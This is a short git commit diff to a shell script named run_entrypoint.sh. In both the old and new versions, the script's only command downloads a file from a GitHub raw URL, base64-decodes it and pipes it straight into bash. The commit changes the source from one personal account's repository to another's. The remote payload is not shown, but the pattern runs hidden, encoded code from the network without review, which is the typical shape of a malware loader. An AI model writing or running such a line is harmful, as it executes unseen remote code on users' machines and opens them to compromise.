41a0482eb2c234ccd2fe1ee63a084bb19d488987
geraldmagnum49 <geraldmagnum49@gmail.com>
2026-05-27 01:55:38 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/paulbullet654/racer/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/geraldmagnum49/local/refs/heads/main/entrypoint.sh | base64 -d | bash
